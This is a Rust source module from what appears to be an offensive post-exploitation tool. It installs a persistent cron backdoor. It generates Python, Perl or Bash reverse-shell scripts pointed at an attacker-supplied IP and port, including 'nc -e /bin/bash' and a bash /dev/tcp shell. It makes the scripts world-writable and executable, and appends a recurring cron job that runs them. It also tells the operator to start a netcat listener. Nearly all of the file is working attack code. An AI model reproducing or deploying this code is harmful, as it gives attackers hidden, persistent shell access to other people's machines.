use std::process::Command;
use std::fs::File;
use std::io::{self, BufRead};
use std::io::prelude::*;

use crate::sanitizer;

pub fn create_cron (source_ip: String, port: String, mut path: String, malicious_file: String, choice: u8, time: String) -> io::Result<()> {
    
    let last_char: Option<char> = path.chars().last();

    if let Some(slash) = last_char  {
        if slash == '/'{

        }
        else {
            path.push('/');
        }
        
    }
    
    let full_path = [path, malicious_file].concat();
    let s_port = port.clone();
    let path_script = full_path.clone();

    //Get all cron of the current user and save it in the file
    let get_cron_in_file = "crontab -l > all_cron";
    let mut output = Command::new("sh")
    .arg("-c")
    .arg(get_cron_in_file)
    .output()
    .expect("Failed to execute command");

    let mut err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    //Read the content of the file which contain all cron
    let all_cron_file = File::open("all_cron")?;
    let reader_cron_file = io::BufReader::new(all_cron_file);

    let mut cron_lines = Vec::new();

    //Stock each line of cron file in a vector. The vector will be used later to rewrite the cron file
    for line in reader_cron_file.lines() {
        cron_lines.push(line?);
    }

    if choice == 1 {
        let result = write_shell_pyfile(port, source_ip, full_path);
        sanitizer::sanitize_return_fn(result);


    }
    else if choice == 2 {
        let result = write_shell_perl(port, source_ip, full_path);
        sanitizer::sanitize_return_fn(result);
    }
    else if choice == 3 {
        let result = write_shell_bash(port, source_ip, full_path);
        sanitizer::sanitize_return_fn(result);
    }

    //Create the malicious cron and store it in our vector
    let time_str: &str = time.as_str();
    let path_script_str: &str = path_script.as_str();
    let mut new_cron = ["*/", time_str].concat();
    new_cron.push_str(" * * * * ");
    if choice == 1 {
        new_cron.push_str("python ");
    }
    else if choice == 2 {
        new_cron.push_str("perl ");
    }
    new_cron.push_str(path_script_str);

    cron_lines.push(new_cron);

    //Write all existing cron + our malicious cron in the file
    let mut file = File::create("all_cron")?;
    for elem in cron_lines {
        let mut elem_clone = elem.clone();
        elem_clone.push_str("\n");
        file.write_all(elem_clone.as_bytes())?;
    }

    //Delete all existing cron of the current user before reimport of all cron
    output = Command::new("sh")
    .arg("-c")
    .arg("crontab -r")
    .output()
    .expect("Failed to execute command");

    err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);
    
    //Reimport the cron file to the current user
    output = Command::new("sh")
    .arg("-c")
    .arg("crontab all_cron")
    .output()
    .expect("Failed to execute command");

    err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    //Delete the file that contain all cron task
    output = Command::new("sh")
    .arg("-c")
    .arg("rm all_cron")
    .output()
    .expect("Failed to execute command");

    err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    println!("\n\x1b[36mGreat ! Please wait the cron, and your backdoor will be installed correctly\n");
    println!("Don't forget to put this netcat command on your attacker machine: nc -lvp {}\x1b[0m", &s_port);

    Ok(())
}

fn write_shell_pyfile(port: String, source_ip: String, full_path: String) -> std::io::Result<()>{
    let mut file = File::create(&full_path)?;
    file.write_all(b"import socket,subprocess,os;\n")?;
    file.write_all(b"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n")?;
    let mut v_ip = ["v_ip='", &source_ip].concat();
    v_ip.push_str("';\n");
    file.write_all(v_ip.as_bytes())?;
    let mut v_port = ["s.connect((v_ip,", &port].concat();
    v_port.push_str("));\n");
    file.write_all(v_port.as_bytes())?;
    file.write_all(b"os.dup2(s.fileno(),0);\n")?;
    file.write_all(b"os.dup2(s.fileno(),1);\n")?;
    file.write_all(b"os.dup2(s.fileno(),2);\n")?;
    file.write_all(b"v_shell_path='/usr/bin/bash';\n")?;
    file.write_all(b"v_shell_value='-i';\n")?;
    file.write_all(b"p=subprocess.call([v_shell_path,v_shell_value]);\n")?;

    //Do chmod 777 on the malicious python file to give all right and enable execution
    let chmod = ["chmod 777 ", &full_path].concat();
    let output = Command::new("sh")
    .arg("-c")
    .arg(chmod)
    .output()
    .expect("Failed to execute command");

    let err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    Ok(())
}

fn write_shell_perl(port:String, source_ip: String, full_path: String) -> std::io::Result<()>{
    let mut file = File::create(&full_path)?;
    file.write_all(b"use Socket;\n")?;
    let mut v_ip = ["$i='", &source_ip].concat();
    v_ip.push_str("';\n");
    file.write_all(v_ip.as_bytes())?;
    let  mut v_port = ["$p=", &port].concat();
    v_port.push_str(";\n");
    file.write_all(v_port.as_bytes())?;
    file.write_all(b"socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\n")?;
    file.write_all(b"if(connect(S,sockaddr_in($p,inet_aton($i)))){\n")?;
    file.write_all(b"open(STDIN,'>&S');\n")?;
    file.write_all(b"open(STDOUT,'>&S');\n")?;
    file.write_all(b"open(STDERR,'>&S');\n")?;
    file.write_all(b"exec('/usr/bin/bash -i');\n")?;
    file.write_all(b"};\n")?;

    //Do chmod 777 to give all right and enable execution
    let chmod = ["chmod 777 ", &full_path].concat();
    let output = Command::new("sh")
    .arg("-c")
    .arg(chmod)
    .output()
    .expect("Failed to execute command");

    let err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    Ok(())
}

fn write_shell_bash(port: String, source_ip: String, full_path: String) -> std::io::Result<()> {
    let mut file = File::create(&full_path)?;

    //Check if netcat is installed on the system
    let ls_1 = Command::new("sh")
    .arg("-c")
    .arg("ls /bin/nc")
    .output()
    .expect("Failed to execute command");

    //Check if netcat is installed on the system
    let ls_2 = Command::new("sh")
    .arg("-c")
    .arg("ls /bin/usr/nc")
    .output()
    .expect("Failed to execute command");

    //If netcat is installed, we make a malicious bash script by netcat reverse shell
    if ls_1.stderr.is_empty() || ls_2.stderr.is_empty() {
        file.write_all(b"#!/bin/bash\n\n")?;
        let mut remote_ip = ["REMOTE_IP=\"", &source_ip].concat();
        remote_ip.push_str("\"\n");
        file.write_all(remote_ip.as_bytes())?;
        let mut remote_port = ["REMOTE_PORT=", &port].concat();
        remote_port.push_str("\n\n");
        file.write_all(remote_port.as_bytes())?;
        file.write_all(b"/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n")?;

    }
    //If netcat is not installed, we make a malicious bash script by /dev/tcp trick
    else {
        file.write_all(b"#!/bin/bash\n\n")?;
        file.write_all(b"/bin/bash -c 'bash -i >& /dev/tcp/")?;
        file.write_all(source_ip.as_bytes())?;
        file.write_all(b"/")?;
        file.write_all(port.as_bytes())?;
        file.write_all(b" 0>&1' 2>/dev/null &\n")?;
        
    }
    
    //Do chmod 777 to give all right and enable execution
    let chmod = ["chmod 777 ", &full_path].concat();
    let output = Command::new("sh")
    .arg("-c")
    .arg(chmod)
    .output()
    .expect("Failed to execute command");

    let err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    Ok(())
}
